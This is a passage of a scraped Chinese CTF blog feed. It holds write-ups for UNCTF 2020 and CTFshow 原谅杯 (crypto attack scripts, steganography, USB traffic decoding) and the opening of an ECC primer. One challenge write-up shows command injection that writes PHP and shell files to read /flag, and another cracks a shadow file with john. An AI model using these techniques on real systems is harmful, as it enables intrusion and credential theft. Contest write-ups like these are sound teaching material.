fraction into a list of partial quotients [a0, ..., an] a = x // y pquotients = [a] while a * y != x: x, y = y, x - a * y a = x // y pquotients.append(a) return pquotientsdef convergents_from_contfrac(frac): # computes the list of convergents using the list of partial quotients convs = []; for i in range(len(frac)): convs.append(contfrac_to_rational(frac[0 : i])) return convsdef contfrac_to_rational (frac): # Converts a finite continued fraction [a0, ..., an] to an x/y rational. if len(frac) == 0: return (0,1) num = frac[-1] denom = 1 for _ in range(-2, -len(frac) - 1, -1): num, denom = frac[_] * num + denom, num return (num, denom)e= 18437613570247445737704630776150775735509244525633303532921813122997549954741828855898842356900537746647414676272022397989161180996467240795661928117273837666615415153571959258847829528131519423486261757569454011940318849589730152031528323576997801788206457548531802663834418381061551227544937412734776581781n= 147282573611984580384965727976839351356009465616053475428039851794553880833177877211323318130843267847303264730088424552657129314295117614222630326581943132950689147833674506592824134135054877394753008169629583742916853056999371985307138775298080986801742942833212727949277517691311315098722536282119888605701c= 140896698267670480175739817539898638657099087197096836734243016824204113452987617610944986742919793506024892638851339015015706164412994514598564989374037762836439262224649359411190187875207060663509777017529293145434535056275850555331099130633232844054767057175076598741233988533181035871238444008366306956934 def egcd(a, b): if a == 0: return (b, 0, 1) g, x, y = egcd(b % a, a) return (g, y - (b // a) * x, x)def mod_inv(a, m): g, x, _ = egcd(a, m) return (x + m) % mdef isqrt(n): x = n y = (x + 1) // 2 while y &lt; x: x = y y = (x + n // x) // 2 return x def crack_rsa(e, n): frac = rational_to_contfrac(e, n) convergents = convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 # check if x*x - s*x + n = 0 has integer roots D = s * s - 4 * n if D &gt;= 0: sq = isqrt(D) if sq * sq == D and (s + sq) % 2 == 0: return dd = crack_rsa(e, n)m = hex(pow(c, d, n))[2:]print(bytes.fromhex(m)) ​ wing 你过office二级了吗 提示office，猜测为word中某种字体，打开word输入字母+数字，再切换各字体核对，发现为Wingdings 2字体，对照替换得flag。 ​ signin Really baby problem about block cipherflag 格式： flag{} AES-ECB模式两次加密，且密钥已知位较多，可采用中间人攻击（MITM）。 爆破脚本： 1234567891011121314151617181920212223242526272829from Crypto.Cipher import AESfrom binascii import hexlify,unhexlifyfrom string import printablealph = printablem = &#x27;&#x27;c = &#x27;&#x27;flag_c = &#x27;&#x27;middle = dict();for x in alph: for y in alph: for z in alph: key1 = &#x27;%s%s%s%s&#x27; % (&#x27;0&#x27; * 13, x, y, z) cipher = AES.new(key1) middle.update(&#123;cipher.encrypt(m): key1&#125;)print &quot;\\nTable built...\\n&quot;;for x in alph: for y in alph: for z in alph: key2 = &#x27;%s%s%s%s&#x27; % (x, y, z, &#x27;0&#x27; * 13) cipher = AES.new(key2) d = cipher.decrypt(c) if d in middle: print &quot;\\nKeys found: %s; %s\\nFlag:&quot; % (middle[d].encode(&#x27;hex&#x27;), key2.encode(&#x27;hex&#x27;)) cipher1 = AES.new(middle[d]) print cipher1.decrypt(cipher.decrypt(flag_c)) ​ 快乐数学_0x00 刚才我问扎克利，扎总发生甚么事了。扎总说怎么回事。我给扎总发了几张截图。扎总一看，噢，原来是昨天，几个大学生，二十多岁，他们说，哎~。有一个说，我在 UNCTF 打比赛，头都做疼了，扎总，你能不能教教我怎么做题，哎，帮我分数弄高一点。扎总说，可以，你在 UNCTF 死做题，不好用。他不服气。扎总说，我说小朋友，你多长两个脑子来做我这新题。他做不动，他说你这个没用。扎总说，我这个有用，他是数学，数学对计算机基础很重要，二百多个人做不出我这题。他非要和我试试。扎总说，可以。扎总一说他啪站起来了，很快啊，然后上来一个左正蹬，一个右鞭腿，一个左刺拳。扎总全部防出去了啊，防出去以后，自然是传统功夫以点到为止，右手把数学题摁在他鼻子上，没打他，扎总笑了一下，准备收拳。后面我暂时编不下去了，你们来跟扎总打吧。数学题，可能存在异议的，群里私聊 Hanser 的老公。 链接: https://pan.baidu.com/s/1nB8j4TN3HFe_SXvrwzyE2g 密码: ca04 纯高数回忆录，复习了一把，采用wolframalpha辅助计算。 第一个，$\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\cdots+\\sqrt[n]{2020}}{2020})^n$： 计算到2020开n次方的求和不好表示，可以用wolframalpha观察规律： $\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}}{2020})^n=\\sqrt{2}$ $\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\sqrt[n]{3}}{2020})^n=\\sqrt[3]{6}=\\sqrt[3]{2\\cdot3}$ $\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\sqrt[n]{3}+\\sqrt[n]{4}}{2020})^n=\\sqrt[4]{24}=\\sqrt[4]{2\\cdot3\\cdot4}$ $\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\sqrt[n]{3}+\\sqrt[n]{4}+\\sqrt[n]{5}}{2020})^n=\\sqrt[5]{120}=\\sqrt[5]{2\\cdot3\\cdot4\\cdot5}$ 以此类推，$\\lim \\limits_{n \\to \\infty} (\\cfrac{1+\\sqrt[n]{2}+\\cdots+\\sqrt[n]{2020}}{2020})^n=\\sqrt[2020]{2020!}$ 第二个，$\\lim \\limits_{x \\to +\\infty} \\cfrac{\\int_{0}^{x}\\text{d}u\\int_{0}^{u}[u^2-3\\sin(u-t)^2] \\text{d}t }{x^8}$： wolframalpha编写： limit (integrate (integrate (u^2-3sin(u-t)^2),t=0 to u),u=0 to x)/(x^8) as x-&gt;+∞ 计算得出：$\\lim \\limits_{x \\to +\\infty} \\cfrac{\\int_{0}^{x}\\text{d}u\\int_{0}^{u}[u^2-3\\sin(u-t)^2] \\text{d}t }{x^8}=\\cfrac{1}{112}$ 第三个，设 $\\Omega:x^2+y^2 \\leq 3z,1 \\leq z \\leq 4$，求 $\\displaystyle\\iiint_\\Omega \\cfrac{1}{\\sqrt{x^2+y^2+z}}\\text{d}v$： 转换到极坐标求解，设 $x=r\\sin{\\theta},y=r\\cos{\\theta}$： wolframalpha编写： (integrate dθ,θ=0 to 2*pi)(integrate r/sqrt(r^2+z) dr, r=0 to sqrt(3z)) integrate 2*pi*sqrt(z) dz, z=1 to 4 计算得出： $\\displaystyle\\iiint_\\Omega \\cfrac{1}{\\sqrt{x^2+y^2+z}}\\text{d}v=\\int_{1}^{4}\\text{d}z\\int_{0}^{2\\pi}\\text{d}\\theta \\int_{0}^{\\sqrt{3z}}\\cfrac{r}{r^2+z}\\text{d}r=\\int_{1}^{4}2\\pi\\sqrt{z}\\text{d}z=\\cfrac{28\\pi}{3}$ 最后，合并为\\sqrt[2020]&#123;2020!&#125;-\\frac&#123;1&#125;&#123;112&#125;-\\frac&#123;28\\pi&#125;&#123;3&#125;，md5值为flag。 ​ Miscbaba_is_you 了解一下png文件格式 16进制查看，文件尾有一串B站网址，访问，在评论区发现flag。 ​ 爷的历险记 RPG小游戏爷把flag弄丢了, 你可以帮他找回来吗 RPG小游戏，启动玩耍。 屋里屋外到处寻找线索，发现两个箱子，分部用base64解码出密码66668888和摩斯密码解码出密码23332333打开箱子拿奖励，依次勉强打过屋外主场景左边和下边两个场景的小boss，屋外主场景右下方商人处可以购买hint1和hint2，hint2提示查看游戏存档。 想到修改存档文件的方式，更改金钱以购买hint3。使用RPG存档在线修改器修改rpgsave文件中的金钱属性值到最大值，再回到游戏加载存档，购买hint3即为flag。 ​ 阴阳人编码发现含就这.、就这¿、不会吧!三种字符串，需要一点脑洞，联想到Ook编码，在线解密得flag。 ​ 躲猫猫 我躲好了，你来找我 直接打开报错，右键压缩包打开，在sharedStrings.xml发现base64编码字符串，base64+url解码得flag。 ​ YLB’s CAPTCHA - 签到题 YLB同款验证码 硬看到眼睛疼就能过了，可以考虑修改css配色方案降低难度。 ​ 撕坏的二维码 RPG小游戏爷把flag弄丢了, 你可以帮他找回来吗 部分遮盖的二维码，直接用QR Rearch识别出flag。 ​ 网络深处1 好孩子不要上洋葱鸭 三个文件，txt有一串数字，zip包加密， Audacity分析wav文件，结合文件名“拨号音”，用DTMF拨号音识别脚本识别出wav的手机号码，解压得一个wav文件和txt文件，继续Audacity分析wav文件，切换到频谱图发现关键字我是tupper， 了解到Tupper为自我指涉公式，找到一个在线还原图像网站还原得flag。 ​ mouse_click flag格式为unctf{*}，**中的字母统一为大写 简单鼠标流量取证。 提取usb数据信息： tshark -r mouse.pcapng -T fields -e usb.capdata &gt; usbdata.txt 提取坐标值脚本： 12345678910111213141516171819202122nums = []keys = open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)result = open(&#x27;result.txt&#x27;,&#x27;w&#x27;)posx = 0posy = 0for line in keys: line = line.strip() if line == &#x27;&#x27; :#忽略空行 continue x = int(line[6:8],16) y = int(line[9:11],16) if x &gt; 127 : x -= 256 if y &gt;127 : y -= 256 posx += x posy += y btn_flag = int(line[3:5],16) if btn_flag == 1 : result.write(str(posx)+&#x27; &#x27;+str(posy)+&#x27;\\n&#x27;)keys.close()result.close() 运行：python analyse.py 控制台画图：gnuplot.exe -e &quot;plot &#39;result.txt&#39;&quot; -p ​ 被删除的flag flag被删除了，你能恢复它吗 16进制查看，搜索unctf得flag。 ​ 你能破解我的密码吗 flag内容为密码的32位小写的md5，请用unctf{}包裹字符串 shadow文件中倒数第二行，用john命令破解弱口令： john --show shadow 得到密码，md5处理即flag。 ​ EZ_IMAGE手撸最终肯定能出来，不过学到更好用的自动化姿势（montage+gaps），适用于任何拼图题： 先把225张图用ImageMagick中的montage命令合成一张大图： montage *.jpg -tile 15x15 -geometry 60x60+0+0 out.jpg 得到一张大图之后，用gaps来进行还原： gaps --image=out.jpg --generations=40 --population=225 --size=60 --save ​ 零 我瞎了看不到flag了 零宽字符隐写，可以在vim中用vim -A xxx.txt查看核实。 全选复制，用在线工具直接取出flag。 ​ YLB绝密文件 提示1：需要提取出三个文件: *.pyc,*.py,*.zip提示2：zip文件可以以原始数据的形式导出Hex值，再导入Winhex/010 Editor然后删去非Zip数据部分（自行百度Zip格式 Wireshark查看流量包，追踪TCP流，分别在流11、流16和流20流提取出xor.py、secret.cpython-38.pyc和YLBSB.zip三个文件。 用uncompyle6还原pyc文件为secret.py文件拿到key值YLBSB?YLBNB!，再根据xor.py代码逻辑，将key与zip包中的YLBSB.xor文件16进制值异或，保存得到YLBSB.docx文件，打开得到flag。 ​ 倒影16进制查看exe文件发现是jpg图，在尾部发现4030B405，即为倒着存入的一段16进制zip文件，取出16进制逆序还原，用ARCHPR纯数字跑出弱口令得到flag。 ​ Other调查问卷 请大家认真填写哟~ 只有几道，不多，最多占用大家两三分钟…问卷地址：https://wj.qq.com/s2/7519766/6af6/想要大家一起吐槽？知乎链接：https://www.zhihu.com/question/429290669/answer/1564365629 反馈就是了。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"CTFshow 原谅杯","slug":"match-CTFshow-原谅杯","date":"2020-11-11T16:13:12.000Z","updated":"2021-01-24T13:30:59.541Z","comments":true,"path":"2020/11/12/match-CTFshow-原谅杯/","link":"","permalink":"https://lazzzaro.github.io/2020/11/12/match-CTFshow-%E5%8E%9F%E8%B0%85%E6%9D%AF/","excerpt":"","text":"原谅杯比赛预告：CTFshow 原谅杯平台：https://ctf.show开始：2020/11/11 00:00结束：2020/11/11 23:59内容：本次采用闯关模式，必须按顺序解题，否则无法欣赏狗血的爱情故事。规则：1 比赛期间可以随意讨论，wp须在比赛结束后发布，wp统一发布地址：https://wp.ctf.show2 公平竞技，独立比赛3 服务器不要爆破，不要攻击服务器，不要扫描!!!4 奖品：帽子一个(颜色随机) 原谅1 附件：yuanliang_1.zip 压缩包有 story.zip 和 原谅1.png，群里hint+拟音解密emoji，密码1317bi77p9u， 解压拿到 1.jpg 和 剧情1.txt，stegsolve查看1.jpg的rgb通道发现flag。 ​ 原谅2 附件：yuanliang_2.zip 压缩包有未加密的 hint.txt，火星文解密得到解压密钥，解压拿到flag.txt内容。 ​ 原谅3_来份色图 附件：yuanliang_3.zip Hint1: 阿狸2020年11月11日10:49在群里说得对 Hint2: 第一步、色图一分为二（常见文件格式/头尾了解一下）；第二步、rrggbbrrggbbrrggbb…；第三步、你的工具更新了吗 压缩包有未加密的setu.zip，解压得到setu.png，010editor分析存在双图，foremost分解得到两张png。 将setu.zip用zsteg进行LSB分析，发现隐藏的png图，提取出新png图1。 结合盲水印提示，将foremost分解出的两张png同样用zsteg进行LSB分析，分别提取出新png图2、图3。 用github上各种盲水印脚本，使用正确脚本尝试解图1、图2、图3，有一种情况能出flag图。 ​ 原谅4 列目录可以看到剧情文件 Hint1: 老前辈说过“最安全的系统就是什么都没有”，我把没用的命令都删了，看你还怎么执行 Hint2: 你知道系统环境变量里的PATH是干什么的吗？ GET方式传入参数xbx，发现只能用ls列目录，尝试用echo写入文件成功，写入phpinfo()： echo &#39;&lt;?php phpinfo();?&gt;&#39; &gt; phpinfo.php 访问发现存在open_basedir限制，试过各种open_basedir绕过、disable_function写bypass读/flag均不成功。 提示环境变量，查看：echo $PATH，分别到各路径下查看，仅存ls/rm/sh三种命令（无法执行常用命令的原因）。 有sh命令，且可写入文件，尝试往根目录写入shell脚本： echo -e &quot;%23!/bin/sh\\nwhile read line\\ndo\\necho \\$line\\ndone &lt; /flag&quot; &gt; ../../../read 成功写入，再执行/bin/sh ../../../read得flag。 赛后还学到其他各种骚姿势。 ​ 原谅5-6未解。 ​ 原谅7_baby加密 encrypt.exe -e flag.txt 附件：encrypt.exe、encrypted_flag.txt Hint1: maybe des? IDA跟进main函数，发现24位字符串123456788765432112345678，再跟进加密函数sub_401E16： sub_401E16((__int64)&amp;v13, (__int64)argv, v44, (__int64)File, (__int64)&amp;v14, 1, v8, v9, v10, v11, 1); 发现传入的24为字符串分为三组分别通过函数sub_401B7A处理： sub_401B7A((void *)a1, (const void *)a2, v16, v14, 1);sub_401B7A((void *)a1, (const void *)a2, v16 + 8, v14, 0);sub_401B7A((void *)a1, (const void *)a2, v16 + 16, v14, 1); 结合提示DES，可知为3DES加密（24位密钥，且第一步处理会将密钥分成三组密钥分别处理，第一组解密，第二组加密，第三组解密，对应sub_401E16最后一个参数值）。 用在线解密工具解密密文即可得flag。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"流量分析","slug":"misc-流量分析","date":"2020-11-07T17:01:00.000Z","updated":"2022-08-14T16:32:31.535Z","comments":true,"path":"2020/11/08/misc-流量分析/","link":"","permalink":"https://lazzzaro.github.io/2020/11/08/misc-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","excerpt":"","text":"​ USB流量工具：knm 键盘流量USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。其中键盘击键信息集中在第三个字节中。键位映射关系参考：《USB键盘协议中键码》中的HID Usage ID。 步骤： tshark命令提取cap data tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\\s*$/d&#39; &gt; usbdata.txt（去空行） 将数据还原成键位 提取出来的数据可能会带冒号，也可能不带，但是一般的脚本都会按照有冒号的数据来识别。 有冒号时提取数据的[6:8]，无冒号时数据在[4:6]。 加冒号： 1234567891011121314151617f=open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)fi=open(&#x27;out.txt&#x27;,&#x27;w&#x27;)while 1: a=f.readline().strip() if a: if len(a)==16: out=&#x27;&#x27; for i in range(0,len(a),2): if i+2 != len(a): out+=a[i]+a[i+1]+&quot;:&quot; else: out+=a[i]+a[i+1] fi.write(out) fi.write(&#x27;\\n&#x27;) else: breakfi.close() 还原键位： 1234567891011121314151617181920212223#python2#脚本1mappings = &#123; 0x04:&quot;A&quot;, 0x05:&quot;B&quot;, 0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;, 0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;, 0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;, 0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;, 0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;\\n&quot;, 0x2a:&quot;[DEL]&quot;, 0X2B:&quot; &quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;, 0x30:&quot;]&quot;, 0x31:&quot;\\\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;, 0x34:&quot;&#x27;&quot;, 0x36:&quot;,&quot;, 0x37:&quot;.&quot; &#125;nums = []keys = open(&#x27;out.txt&#x27;)for line in keys: if line[0]!=&#x27;0&#x27; or line[1]!=&#x27;0&#x27; or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27;: continue nums.append(int(line[6:8],16))keys.close()output = &quot;&quot;for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += &#x27;[unknown]&#x27;print &#x27;output :\\n&#x27; + output 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#python3#脚本2normalKeys = &#123; &quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;, &quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;, &quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;, &quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;, &quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;, &quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;, &quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123; &quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;, &quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;, &quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;, &quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;, &quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;, &quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#x27;out.txt&#x27;)for line in keys: try: if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;: continue if line[6:8] in normalKeys.keys(): output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;] else: output += [&#x27;[unknown]&#x27;] except: passkeys.close()flag=0print(&quot;&quot;.join(output))for i in range(len(output)): try: a=output.index(&#x27;&lt;DEL&gt;&#x27;) del output[a] del output[a-1] except: passfor i in range(len(output)): try: if output[i]==&quot;&lt;CAP&gt;&quot;: flag+=1 output.pop(i) if flag==2: flag=0 if flag!=0: output[i]=output[i].upper() except: passprint (&#x27;output :&#x27; + &quot;&quot;.join(output)) ​ 鼠标流量USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节。 第一个字节代表按键，当取0x00时代表没有按键，为0x01时代表按左键，为0x02时代表按右键。 第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。 第三个字节与第二字节类似，代表垂直上下移动的偏移。 步骤： tshark命令提取cap data tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\\s*$/d&#39; &gt; usbdata.txt（去空行） 将鼠标数据还原鼠标移动轨迹 提取出来的数据可能会带冒号，也可能不带，但是一般的脚本都会按照有冒号的数据来识别。 有冒号时提取数据的[6:8]，无冒号时数据在[4:6]。 加冒号： 1234567891011121314151617f=open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)fi=open(&#x27;out.txt&#x27;,&#x27;w&#x27;)while 1: a=f.readline().strip() if a: if len(a)==8: out=&#x27;&#x27; for i in range(0,len(a),2): if i+2 != len(a): out+=a[i]+a[i+1]+&quot;:&quot; else: out+=a[i]+a[i+1] fi.write(out) fi.write(&#x27;\\n&#x27;) else: breakfi.close() 测试信息隐藏位置 123456789101112131415161718192021222324nums = []keys = open(&#x27;out.txt&#x27;,&#x27;r&#x27;)f = open(&#x27;xy.txt&#x27;,&#x27;w&#x27;)posx = 0posy = 0for line in keys: if len(line) != 12 : continue x = int(line[3:5],16) y = int(line[6:8],16) if x &gt; 127 : x -= 256 if y &gt; 127 : y -= 256 posx += x posy += y btn_flag = int(line[0:2],16) # 1 for left , 2 for right , 0 for nothing if btn_flag == 2 : # 1 代表左键 f.write(str(posx)) f.write(&#x27; &#x27;) f.write(str(posy)) f.write(&#x27;\\n&#x27;)f.close() gnuplot将坐标转化成图像 gnuplot gnuplot&gt; plot &quot;xy.txt&quot; ​ TLS流量解密：Wireshark首选项 - TLS - RSA keys list - Edit… - TLS Decrypt","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"流量","slug":"流量","permalink":"https://lazzzaro.github.io/tags/%E6%B5%81%E9%87%8F/"},{"name":"USB","slug":"USB","permalink":"https://lazzzaro.github.io/tags/USB/"}],"author":"Lazzaro"},{"title":"ECC","slug":"crypto-ECC","date":"2020-11-07T11:33:18.000Z","updated":"2022-12-15T18:05:23.634Z","comments":true,"path":"2020/11/07/crypto-ECC/","link":"","permalink":"https://lazzzaro.github.io/2020/11/07/crypto-ECC/","excerpt":"","text":"ECC椭圆曲线密码学（英语：Elliptic Curve Cryptography，缩写：ECC）是一种基于椭圆曲线数学的公开密钥加密算法。与传统的基于大质数因子分解困难性的加密方法不同，ECC 依赖于解决椭圆曲线离散对数问题的困难性。它的优势主要在于相对于其它方法，它可以在使用较短密钥长度的同时保持相同的密码强度。目前椭圆曲线主要采用的有限域有以素数为模的整数域 $\\text{GF}(p)$和特征为2的伽罗华域 $\\text{GF}(2^m)$。 ​ 椭圆曲线椭圆曲线的定义式：$y^2+axy+by=x^3+cx^2+dx+e$ 一般方程：$y^2+a_1xy+a_3y=x^3+a_2x^2+a_4x+a_6$ 最常用方程（维尔斯特拉斯标准形式）$y^2=x^3+ax+b$，判别式 $\\Delta=-16(4a^3+27b^2)\\neq 0$ 椭圆曲线的定义也要求曲线是非奇异的。几何上来说，这意味着图像里面没有尖点、自相交或孤立点。代数上来说，这成立当且仅当判别式 $\\Delta \\neq 0$。 还需要一个无穷远点作为曲线的一部分，用 $\\text{O}$ 表示。 椭圆曲线表达式$\\{(x,y) \\in \\mathbb{R}^2 \\mid y^2=x^3+ax+b,4a^3+27b^2\\neq0\\} \\cup \\{\\text{O}\\}$ 椭圆曲线阿尔贝群$\\text{O}$ 为零元，相反数 $P$ 为关于X轴对称的另一边的点，加法规则为直线三点 $P+Q+R=0$。 